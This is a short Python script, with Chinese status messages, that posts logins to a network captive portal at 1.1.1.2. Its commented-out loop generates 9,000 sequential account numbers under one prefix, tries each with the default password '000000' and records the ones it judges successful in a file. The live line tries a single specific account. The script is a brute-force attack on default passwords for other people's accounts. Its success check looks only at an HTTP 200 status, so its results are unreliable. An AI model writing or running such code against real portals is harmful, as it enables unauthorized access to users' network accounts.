import requests
import random

def writeResult(fileName, content):
    with open(fileName, 'a+') as f:
        for co in content:
            f.write(co)

def login(username, password, result):
    url = "http://1.1.1.2/ac_portal/20230304150257/pc.html?template=20230304150257&tabs=pwd&vlanid=1026&url=http://www.msftconnecttest.com%2fredirect"

    data = {
        "username": username,
        "password": password
    }

    response = requests.post(url, data=data)

    if response.status_code == 200:
        print("登录成功！")
        result.append(username)
    else:
        print("登录失败！")

if __name__ == '__main__':

    # filename = 'result.txt'
    Result = []
    # # 生成账号
    # for num in range(1000, 10000):
    #     username = "1939002" + str(num)
    #     password = "000000"
    #     login(username, password, Result)
    #
    # writeResult(filename, Result)
    login("19390027262", "000000", Result)






